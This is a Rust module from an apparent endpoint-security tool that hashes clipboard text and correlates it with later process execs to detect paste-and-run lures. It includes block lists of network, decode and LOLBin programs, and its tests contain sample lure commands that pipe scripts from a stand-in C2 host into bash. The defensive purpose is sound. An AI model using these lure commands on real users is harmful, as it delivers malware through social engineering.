//! Clipboard hash buffer and exec correlation.
//!
//! Privacy: raw clipboard text is never stored here. We keep SHA-256 hashes of the whole
//! content and of each normalised command segment, so an exec of `curl ... ` or
//! `bash -c "$(curl ...)"` can be matched to a pasted pipeline without retaining it.

use cfx_engine::{sha256_hex, Level, Origin};
use std::collections::HashMap;
use std::time::{Duration, Instant};

#[derive(Debug, Clone)]
pub struct Entry {
    pub full_hash: String,
    pub origin: Origin,
    pub first_seen: Instant,
    pub level: Level,
    pub score: f64,
    pub features: Vec<String>,
    /// The alert emitted for this content (privacy-safe: no raw text). Re-used when the
    /// command is later executed, so both events share one dedupe key.
    pub alert: Option<std::sync::Arc<cfx_alert::Alert>>,
}

pub struct HashBuffer {
    ttl: Duration,
    /// full content hash -> first sighting. Clipboard managers that re-write a known
    /// hash inherit its original origin.
    by_full: HashMap<String, Entry>,
    /// segment hash -> full content hash.
    by_segment: HashMap<String, String>,
}

impl HashBuffer {
    pub fn new(ttl: Duration) -> Self {
        Self {
            ttl,
            by_full: HashMap::new(),
            by_segment: HashMap::new(),
        }
    }

    pub fn prune(&mut self) {
        let ttl = self.ttl;
        self.by_full.retain(|_, e| e.first_seen.elapsed() < ttl);
        let live: std::collections::HashSet<&String> = self.by_full.keys().collect();
        self.by_segment.retain(|_, full| live.contains(full));
    }

    /// Verdict already recorded for this exact content, if any.
    pub fn known_level(&self, full_hash: &str) -> Option<Level> {
        self.by_full.get(full_hash).map(|e| e.level)
    }

    pub fn first_origin(&self, full_hash: &str) -> Option<Origin> {
        self.by_full.get(full_hash).map(|e| e.origin.clone())
    }

    /// Insert or refresh. Keeps the first origin; a later, higher verdict wins.
    pub fn record(&mut self, text: &str, entry: Entry) {
        self.prune();
        for seg in indexable_segments(text) {
            self.by_segment
                .insert(sha256_hex(seg.as_bytes()), entry.full_hash.clone());
        }
        match self.by_full.get_mut(&entry.full_hash) {
            Some(prev) => {
                if entry.level > prev.level {
                    prev.level = entry.level;
                    prev.score = entry.score;
                    prev.features = entry.features;
                }
                let better = match (&entry.alert, &prev.alert) {
                    (Some(new), Some(old)) => new.severity_rank() > old.severity_rank(),
                    (Some(_), None) => true,
                    _ => false,
                };
                if better {
                    prev.alert = entry.alert;
                }
            }
            None => {
                self.by_full.insert(entry.full_hash.clone(), entry);
            }
        }
    }

    /// Match an exec's argv against buffered clipboard segments. Content hash, not
    /// recency, so a paste from a clipboard manager's history still matches.
    pub fn match_exec(&self, argv: &[String]) -> Option<&Entry> {
        exec_candidates(argv)
            .iter()
            .filter_map(|c| self.by_segment.get(&sha256_hex(c.as_bytes())))
            .find_map(|full| self.by_full.get(full))
    }
}

/// Minimal POSIX-ish word splitting: quotes and backslash escapes. Good enough to
/// normalise a pasted segment to what execve sees; not a shell.
pub fn shell_words(s: &str) -> Vec<String> {
    let mut words = Vec::new();
    let mut cur = String::new();
    let mut in_word = false;
    let mut chars = s.chars().peekable();
    while let Some(c) = chars.next() {
        match c {
            '\'' => {
                in_word = true;
                for d in chars.by_ref() {
                    if d == '\'' {
                        break;
                    }
                    cur.push(d);
                }
            }
            '"' => {
                in_word = true;
                while let Some(d) = chars.next() {
                    match d {
                        '"' => break,
                        '\\' => {
                            if let Some(&n) = chars.peek() {
                                if matches!(n, '"' | '\\' | '$' | '`') {
                                    cur.push(n);
                                    chars.next();
                                    continue;
                                }
                            }
                            cur.push('\\');
                        }
                        _ => cur.push(d),
                    }
                }
            }
            '\\' => {
                in_word = true;
                if let Some(n) = chars.next() {
                    cur.push(n);
                }
            }
            c if c.is_whitespace() => {
                if in_word {
                    words.push(std::mem::take(&mut cur));
                    in_word = false;
                }
            }
            _ => {
                in_word = true;
                cur.push(c);
            }
        }
    }
    if in_word {
        words.push(cur);
    }
    words
}

fn normalise(seg: &str) -> Option<String> {
    let w = shell_words(seg.trim());
    (!w.is_empty()).then(|| w.join(" "))
}

/// Split pasted text into the command segments a shell would exec: pipeline / list
/// elements, plus the contents of `$( ... )` substitutions.
pub fn segments(text: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut pieces = vec![text.to_string()];
    // Pull out $( ... ) bodies (one level deep is enough for real lures).
    let mut rest = text;
    while let Some(i) = rest.find("$(") {
        let body = &rest[i + 2..];
        if let Some(j) = body.find(')') {
            pieces.push(body[..j].to_string());
            rest = &body[j..];
        } else {
            break;
        }
    }
    for p in pieces {
        for seg in p.split(['|', ';', '&', '\n']) {
            if let Some(n) = normalise(seg) {
                out.push(n);
            }
        }
        if let Some(n) = normalise(&p) {
            out.push(n);
        }
    }
    out.sort();
    out.dedup();
    out
}

/// Shortest segment of a multi-line paste that identifies a command by itself.
const MIN_MULTILINE_SEGMENT_LEN: usize = 12;

/// Programs that turn a pipeline's text into execution: interpreters, plus the local
/// decode steps a lure pipes through on the way (`base64 -d`, `xxd -r`, `gunzip`).
const PIPELINE_STAGES: &[&str] = &[
    "sh",
    "bash",
    "zsh",
    "dash",
    "ksh",
    "fish",
    "perl",
    "ruby",
    "node",
    "php",
    "osascript",
    "base64",
    "base32",
    "basenc",
    "xxd",
    "gunzip",
    "zcat",
    "openssl",
    "rev",
    "tr",
    "curl",
    "wget",
    "powershell",
    "pwsh",
    "iex",
];

fn pipeline_stage(segment: &str) -> bool {
    let first = segment.split(' ').next().unwrap_or_default();
    let name = program_name(first);
    PIPELINE_STAGES.contains(&name.as_str()) || name.starts_with("python")
}

/// The segments of a paste worth matching against execs. `segments` splits on every line,
/// so a multi-line paste yields fragments such as `}` or `wc -w` that any unrelated script
/// also contains. A one-line paste is one command, so all its pipeline stages stay (the
/// `bash` of `curl ... | bash`). A multi-line paste keeps segments with an argument and
/// enough text to be specific, short segments whose program is an interpreter or decode
/// step (`bash`, `base64 -d`), and the whole text. Punctuation never matches.
fn indexable_segments(text: &str) -> Vec<String> {
    let trimmed = text.trim();
    let multiline = trimmed.contains(['\n', '\r']);
    let whole = normalise(trimmed);
    segments(text)
        .into_iter()
        .filter(|s| s.chars().any(char::is_alphanumeric))
        .filter(|s| {
            !multiline
                || whole.as_deref() == Some(s.as_str())
                || (s.contains(' ') && s.len() >= MIN_MULTILINE_SEGMENT_LEN)
                || pipeline_stage(s)
        })
        .collect()
}

/// Strings worth hashing for one exec: the joined argv, and for `sh -c X` style
/// invocations the normalised X and each of its segments.
pub fn exec_candidates(argv: &[String]) -> Vec<String> {
    let mut c = vec![argv.join(" ")];
    if let Some(i) = argv
        .iter()
        .position(|a| a == "-c" || a.eq_ignore_ascii_case("-command"))
    {
        if let Some(script) = argv.get(i + 1) {
            c.extend(segments(script));
        }
    }
    c
}

/// Programs that fetch, decode or launch what they are given, so their arguments are
/// commands in effect rather than data.
const ARGUMENT_RUNNERS: &[&str] = &[
    // Fetch and decode.
    "curl",
    "wget",
    "aria2c",
    "nc",
    "ncat",
    "socat",
    "openssl",
    "base64",
    "xxd",
    // Launch another command.
    "sudo",
    "doas",
    "pkexec",
    "env",
    "nohup",
    "setsid",
    "timeout",
    "nice",
    "stdbuf",
    "xargs",
    "busybox",
    "systemd-run",
    "at",
    "crontab",
    "launchctl",
    "chmod",
    // Windows and macOS script hosts and LOLBins (also reachable through Wine or a port).
    "powershell",
    "pwsh",
    "mshta",
    "certutil",
    "bitsadmin",
    "msiexec",
    "rundll32",
    "regsvr32",
    "wscript",
    "cscript",
    "conhost",
    "osascript",
];

/// Interpreters: running a script file with arguments is ordinary, inline code is not.
const INTERPRETERS: &[&str] = &[
    "sh", "bash", "zsh", "dash", "ksh", "fish", "perl", "ruby", "node", "php", "lua",
];

/// Download and temp locations a lure stages a script in.
const STAGING_DIRS: &[&str] = &[
    "/tmp/",
    "/var/tmp/",
    "/dev/shm/",
    "/Downloads/",
    "/.cache/",
    "/private/tmp/",
];

fn program_name(argv0: &str) -> String {
    let base = argv0.rsplit(['/', '\\']).next().unwrap_or(argv0);
    base.strip_suffix(".exe").unwrap_or(base).to_lowercase()
}

/// Whether an exec's arguments are worth scoring as a command when it has no clipboard
/// match. Without this, any program given a suspicious string as plain data (`echo`,
/// `grep`, `git commit -m`, a clipboard helper) reads as that command having run.
pub fn runs_its_arguments(argv: &[String]) -> bool {
    let Some(first) = argv.first() else {
        return false;
    };
    // `-c` catches a renamed shell as well as the usual `sh -c`.
    if argv[1..]
        .iter()
        .any(|a| a == "-c" || a.eq_ignore_ascii_case("-command"))
    {
        return true;
    }
    let name = program_name(first);
    if ARGUMENT_RUNNERS.contains(&name.as_str()) {
        return true;
    }
    let interpreter = INTERPRETERS.contains(&name.as_str()) || name.starts_with("python");
    if !interpreter {
        return false;
    }
    // Short-flag clusters carrying inline code: `bash -lc`, `perl -e`, `node -pe`.
    let inline = argv[1..]
        .iter()
        .any(|a| a.starts_with('-') && !a.starts_with("--") && a.contains(['c', 'e']));
    // A script run from a download or temp location is the second half of
    // download-then-execute, so its command line is worth scoring too.
    let staged = argv[1..]
        .iter()
        .find(|a| !a.starts_with('-'))
        .is_some_and(|script| STAGING_DIRS.iter().any(|d| script.contains(d)));
    inline || staged
}

/// The command text to score for an exec: the -c script if present, else argv joined.
pub fn exec_text(argv: &[String]) -> String {
    if let Some(i) = argv
        .iter()
        .position(|a| a == "-c" || a.eq_ignore_ascii_case("-command"))
    {
        if let Some(script) = argv.get(i + 1) {
            return script.clone();
        }
    }
    argv.join(" ")
}

#[cfg(test)]
mod tests {
    use super::*;

    fn entry(h: &str) -> Entry {
        Entry {
            full_hash: h.into(),
            origin: Origin::Unknown,
            first_seen: Instant::now(),
            level: Level::Warn,
            score: 1.0,
            features: vec![],
            alert: None,
        }
    }

    #[test]
    fn pipeline_segments_match_execs() {
        let pasted = r#"curl -fsSL https://c2.invalid/a.sh | bash"#;
        let mut b = HashBuffer::new(Duration::from_secs(60));
        b.record(pasted, entry("h1"));
        let curl: Vec<String> = ["curl", "-fsSL", "https://c2.invalid/a.sh"]
            .map(String::from)
            .to_vec();
        assert!(b.match_exec(&curl).is_some());
        assert!(b.match_exec(&["bash".to_string()]).is_some());
        assert!(b
            .match_exec(&["ls".to_string(), "-la".to_string()])
            .is_none());
    }

    #[test]
    fn command_substitution_matches() {
        let pasted = r#"/bin/bash -c "$(curl -fsSL https://c2.invalid/install.sh)""#;
        let mut b = HashBuffer::new(Duration::from_secs(60));
        b.record(pasted, entry("h2"));
        let inner: Vec<String> = ["curl", "-fsSL", "https://c2.invalid/install.sh"]
            .map(String::from)
            .to_vec();
        assert!(b.match_exec(&inner).is_some());
        let outer: Vec<String> = [
            "/bin/bash",
            "-c",
            "$(curl -fsSL https://c2.invalid/install.sh)",
        ]
        .map(String::from)
        .to_vec();
        assert!(b.match_exec(&outer).is_some());
    }

    #[test]
    fn multiline_paste_fragments_do_not_match_unrelated_execs() {
        let pasted =
            "{\n  \"a\": 1\n}\necho hi | wc -w\ncurl -fsSL https://c2.invalid/a.sh -o /tmp/a";
        let mut b = HashBuffer::new(Duration::from_secs(60));
        b.record(pasted, entry("h3"));
        // A shell script that merely shares a brace or a short command is unrelated.
        let script = ["sh", "-c", "{ true; }\nwc -w"].map(String::from).to_vec();
        assert!(b.match_exec(&script).is_none());
        let wc = ["wc", "-w"].map(String::from).to_vec();
        assert!(b.match_exec(&wc).is_none());
        // Short interpreter and decode stages of a multi-line paste still match.
        let pasted = "cd /tmp\necho aGk= | base64 -d | bash";
        b.record(pasted, entry("h4"));
        let b64 = ["base64", "-d"].map(String::from).to_vec();
        assert!(b.match_exec(&b64).is_some());
        assert!(b.match_exec(&["bash".to_string()]).is_some());
        // A specific command from the same paste still matches.
        let curl = ["curl", "-fsSL", "https://c2.invalid/a.sh", "-o", "/tmp/a"]
            .map(String::from)
            .to_vec();
        assert!(b.match_exec(&curl).is_some());
    }

    fn args(a: &[&str]) -> Vec<String> {
        a.iter().map(|s| s.to_string()).collect()
    }

    #[test]
    fn data_carriers_are_not_scored_but_runners_are() {
        let lure = "curl https://c2.invalid/a | bash # I am not a robot";
        for carrier in [
            args(&["echo", lure]),
            args(&["grep", "-r", lure, "."]),
            args(&["git", "commit", "-m", lure]),
            args(&["./set_clipboard", lure]),
            args(&["python3", "set_clipboard.py", lure]),
            args(&["bash", "helper.sh", lure]),
            args(&["python3", "/home/me/src/app/tool.py", lure]),
        ] {
            assert!(!runs_its_arguments(&carrier), "{carrier:?}");
        }
        for runner in [
            args(&["bash", "-c", lure]),
            args(&["/bin/bash", "-lc", lure]),
            args(&["/tmp/renamed", "-c", lure]),
            args(&["python3", "-c", "import os"]),
            args(&["perl", "-e", "print 1"]),
            args(&["curl", "-o", "/tmp/a", "https://c2.invalid/a"]),
            args(&["sudo", "bash", "/tmp/a"]),
            args(&["powershell.exe", "-w", "h", "iex x"]),
            args(&["bash", "/tmp/u.sh"]),
            args(&["sh", "/home/me/Downloads/fix.sh", "--yes"]),
            args(&["python3", "/dev/shm/p.py"]),
        ] {
            assert!(runs_its_arguments(&runner), "{runner:?}");
        }
    }

    #[test]
    fn words() {
        assert_eq!(
            shell_words(r#"a "b c" 'd e' f\ g"#),
            vec!["a", "b c", "d e", "f g"]
        );
    }
}
